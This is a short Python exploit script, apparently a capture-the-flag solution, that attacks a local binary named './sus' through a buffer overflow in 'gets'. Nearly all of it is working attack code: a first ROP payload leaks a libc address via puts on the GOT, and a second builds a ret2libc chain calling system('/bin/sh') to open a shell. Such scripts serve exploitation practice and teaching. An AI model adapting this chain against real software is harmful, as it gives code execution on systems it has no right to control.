"""
Leverage first argument of function, then set value to rdi.
BOF because of `gets` and ROP.
"""

from ptrlib import *

file = "./sus"
sock = Process(file)
elf = ELF(file)
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")

sock.debug = True

payload = b"A"*(0x40-0x8)
payload += p64(elf.got("gets")) # Overwrite first arg(`u`) of `sus`
payload += p64(elf.got("gets"))
payload += p64(elf.plt("puts"))
payload += p64(elf.symbol("_start"))

sock.sendlineafter("sus?\n", payload)
libc.base = u64(sock.recvline()) - libc.symbol("gets")

payload = b"A"*0x40 + b"B"*0x8
payload += p64(next(libc.gadget("ret;")))
payload += p64(next(libc.gadget("pop rdi; ret;")))
payload += p64(next(libc.search("/bin/sh")))
payload += p64(libc.symbol("system"))

sock.sendline(payload)

sock.sh()
